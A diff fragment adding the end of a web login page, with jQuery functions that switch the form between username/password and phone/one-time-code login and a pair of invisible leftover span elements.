+			//这个时候进行复制处理。等待提交了
+
+		}
+
+        var namehash =$('#input-username').val();
+        $('#deviceInput').val(deviceId);
+        return true;
+
+    }
+
+
+
+
+
+
+
+
+    function errorTips() {
+        if($('#msg').length>0){
+            $('#username').addClass("err");
+        }
+    }
+
+
+    /*进行相应的点击事件*/
+    function hidetoMessage() {
+        $('#input-username').attr('name','none');
+        $('#input-phone').attr('name','username');
+        $('#input-otp').attr('name','none');
+        $('#messageOtp').attr('name','d_password');
+        $('#aTomMess').attr('data','phone');
+        $('.con-f-others').addClass('hide');
+        $('#input-username').addClass('hide');
+        $('#input-phone').removeClass('hide');
+        $('#lbl-phone').removeClass('hide');
+        $('#p-name').removeClass('hide');
+        $('#p-phone').addClass('hide');
+        $('#input-otp').addClass('hide');
+        $('#password').css('margin-bottom','0px');
+    }
+
+    /***
+     * 用户名密码登录的流程
+     */
+    function hidetoUsername() {
+        $('#input-username').attr('name','username');
+        $('#input-phone').attr('name','none');
+        $('#input-otp').attr('name','d_password');
+        $('#messageOtp').attr('name','none');
+        $('#aTomMess').attr('data','password');
+        $('#input-phone').addClass('hide');
+        $('#lbl-phone').addClass('hide');
+        $('#input-username').removeClass('hide');
+        $('#p-name').addClass('hide');
+        $('#p-phone').removeClass('hide');
+        $('.con-f-others').removeClass('hide');
+        $('#input-otp').removeClass('hide');
+        $('#password').css('margin-bottom','14px');
+
+    }
+</script>
+
+
+
+
+
+
+<span style="margin: 0px auto; border: 2px dotted rgb(0, 0, 0); position: absolute; z-index: 2147483647; visibility: hidden; left: 561px; width: 0px; top: 364px; height: 0px;"></span><span style="z-index: 2147483647; position: absolute; visibility: hidden; left: 546px; width: 50px; top: 349px; height: 20px; font-size: 10px; color: black;"></span></body></html>
